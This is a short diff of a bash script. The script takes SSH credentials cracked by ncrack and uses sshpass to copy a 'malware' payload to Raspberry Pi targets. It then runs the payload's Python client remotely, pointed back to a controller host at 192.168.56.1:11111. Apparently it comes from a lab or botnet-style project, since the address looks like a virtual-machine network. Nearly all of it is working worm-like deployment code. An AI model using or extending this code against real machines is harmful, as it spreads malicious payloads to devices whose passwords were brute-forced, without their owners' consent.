@@ -15,7 +15,7 @@ port="22"
 
 # Payload dir to send to the target PI
 PAYLOAD="./client/"
-CLIENT_EXE="client/run"
+CLIENT_EXE="client/run.py"
 
 # ------------------
 # -- Send Payload --
@@ -34,10 +34,10 @@ function sendPayload() {
 
 	# TODO: Is $payload being escaped properly? 
 	# TODO: Sending payload to $HOME on the remote machine, is there a better place for it?
-	echo -n "Copying malware... " 
+	echo "Copying malware... " 
 	sshpass -p "$4" scp -P ${2} -r "$PAYLOAD" "${3}@${1}:/home/${3}"
-	echo -n "Starting malware... " 
-	sshpass -p "$4" ssh -P "${3}@${1}" "/home/${3}/${CLIENT_EXE}" &
+	echo "Starting malware... " 
+	sshpass -p "$4" ssh -P "${3}@${1}" python3 "/home/${3}/${CLIENT_EXE}" 192.168.56.1 11111
 }
 
 # -------------------
@@ -177,8 +177,3 @@ while read line; do
 	echo "sendPayload ${ip} ${port} ${user} ${pass}"
 	sendPayload ${ip} ${port} ${user} ${pass}
 done < ${logfile}
-
-
-# -- Todo --
-# Parse ncrack output to isolate login creds into a csv file
-# ip, SSH port, username, password, unix timestamp
